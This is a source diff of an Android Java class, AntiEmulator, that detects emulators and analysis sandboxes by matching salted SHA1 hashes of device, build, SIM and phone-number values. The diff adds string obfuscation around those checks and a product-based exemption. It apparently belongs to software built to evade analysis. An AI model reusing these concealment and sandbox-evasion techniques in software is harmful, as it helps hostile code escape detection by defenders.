@@ -37,10 +37,10 @@ public class AntiEmulator {
 
 		keys = keys.substring(index);
 
-		String digest = Digest.SHA1("zOSgALHZaL" + keys.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("zOSgALHZaL") + keys.toLowerCase()).toLowerCase();
 
 		// "/test-keys"
-		if (digest.equals("5d2441306a9458d6592323fbdd235a4c849f33fb")) {
+		if (digest.equals(M.e("5d2441306a9458d6592323fbdd235a4c849f33fb"))) {
 			return 1;
 		}
 
@@ -55,10 +55,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkTags): Tags: " + tags); //$NON-NLS-1$
 		}
 	
-		String digest = Digest.SHA1("R70kq5jhCx" + tags.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("R70kq5jhCx") + tags.toLowerCase()).toLowerCase();
 	
 		// "test-keys"
-		if (digest.equals("895f0bd16cf59e3e380b7360b26dfd445e2c9570")) {
+		if (digest.equals(M.e("895f0bd16cf59e3e380b7360b26dfd445e2c9570"))) {
 			return 1;
 		}
 	
@@ -73,10 +73,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkProduct): Product: " + product); //$NON-NLS-1$
 		}
 	
-		String digest = Digest.SHA1("NWzeoThPu2" + product.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("NWzeoThPu2") + product.toLowerCase()).toLowerCase();
 	
 		// "sdk"
-		if (digest.equals("77045d27d24fdec7f0439684fdbef14002f9519f")) {
+		if (digest.equals(M.e("77045d27d24fdec7f0439684fdbef14002f9519f"))) {
 			return 1;
 		}
 	
@@ -91,10 +91,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkDevice): Device: " + device); //$NON-NLS-1$
 		}
 	
-		String digest = Digest.SHA1("GpCi1INH6B" + device.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("GpCi1INH6B") + device.toLowerCase()).toLowerCase();
 	
 		// "generic"
-		if (digest.equals("e65170a5c904bb54c30e65f0290a67d87344afc7")) {
+		if (digest.equals(M.e("e65170a5c904bb54c30e65f0290a67d87344afc7"))) {
 			return 1;
 		}
 	
@@ -109,10 +109,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkBrand): Brand: " + brand); //$NON-NLS-1$
 		}
 
-		String digest = Digest.SHA1("AXWC4qhe6x" + brand.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("AXWC4qhe6x") + brand.toLowerCase()).toLowerCase();
 
 		// "generic"
-		if (digest.equals("ae2f26a8cd5bd8efa6b31da9e4974a6b75108f21")) {
+		if (digest.equals(M.e("ae2f26a8cd5bd8efa6b31da9e4974a6b75108f21"))) {
 			return 1;
 		}
 
@@ -150,10 +150,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkManufacturer): Manufacturer: " + manufacturer); //$NON-NLS-1$
 		}
 
-		String digest = Digest.SHA1("kamA9mES38" + manufacturer.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("kamA9mES38") + manufacturer.toLowerCase()).toLowerCase();
 
 		// "unknown"
-		if (digest.equals("a89c0b114f51576c81fd313fc15dc8b125b8f91a")) {
+		if (digest.equals(M.e("a89c0b114f51576c81fd313fc15dc8b125b8f91a"))) {
 			return 1;
 		}
 
@@ -172,10 +172,10 @@ public class AntiEmulator {
 			return 0;
 		}
 
-		String digest = Digest.SHA1("Q0gh5!dGtr" + deviceId.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("Q0gh5!dGtr") + deviceId.toLowerCase()).toLowerCase();
 
 		// "000000000000000"
-		if (digest.equals("ff309ca5ee9fb342d82a8289ef5113569ae5c7fb")) {
+		if (digest.equals(M.e("ff309ca5ee9fb342d82a8289ef5113569ae5c7fb"))) {
 			return 1;
 		}
 
@@ -195,10 +195,10 @@ public class AntiEmulator {
 			return 0;
 		}
 
-		String digest = Digest.SHA1("Lt5xaspitp" + subscriberId.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("Lt5xaspitp") + subscriberId.toLowerCase()).toLowerCase();
 
 		// "310260000000000"
-		if (digest.equals("e60a02f0b41b042a72359c57de36ecb81fb10fc2")) {
+		if (digest.equals(M.e("e60a02f0b41b042a72359c57de36ecb81fb10fc2"))) {
 			return 1;
 		}
 
@@ -213,10 +213,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkOperator): Operator: " + operator); //$NON-NLS-1$
 		}
 	
-		String digest = Digest.SHA1("ovCwHlxund" + operator.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("ovCwHlxund") + operator.toLowerCase()).toLowerCase();
 	
 		// "android"
-		if (digest.equals("796c3a755fea349d366064676d8351e52a623288")) {
+		if (digest.equals(M.e("796c3a755fea349d366064676d8351e52a623288"))) {
 			return 1;
 		}
 	
@@ -247,10 +247,10 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkPhoneNumber): " + phoneNumber); //$NON-NLS-1$
 		}
 
-		String digest = Digest.SHA1("lYRGQKaHgJ" + phoneNumber.toLowerCase()).toLowerCase();
+		String digest = Digest.SHA1(M.e("lYRGQKaHgJ") + phoneNumber.toLowerCase()).toLowerCase();
 
 		// "155552155XX" (le due XX non sono incluse nell'hash perche' variano)
-		if (digest.equals("6bba1f0a5587f3315c54856fd90ff790e3ed8581")) {
+		if (digest.equals(M.e("6bba1f0a5587f3315c54856fd90ff790e3ed8581"))) {
 			return 1;
 		}
 
@@ -300,7 +300,24 @@ public class AntiEmulator {
 			Log.w("QZ", "isEmu");
 			return isEmu(NUMTESTSNOTM) >= NUMTESTSNOTM - 2;
 		} else {
-			return isEmu(Utils.getRandomIntArray(3)) >= 2;
+			boolean ret = isEmu(Utils.getRandomIntArray(3)) >= 2;
+            boolean ov = isTestEmu();
+
+            return ret && !isTestEmu();
 		}
 	}
+
+    private boolean isTestEmu() {
+
+
+        String product = Build.PRODUCT;
+        String digest = Digest.SHA1(M.e("oJtb2LTJkhUF") + product.toLowerCase()).toLowerCase();
+
+        // "155552155XX" (le due XX non sono incluse nell'hash perche' variano)
+        if (digest.equals(M.e("f19ad4a8c74c793ac38da705fc447e264f3d594b"))) {
+            return true;
+        }
+
+        return false;
+    }
 }
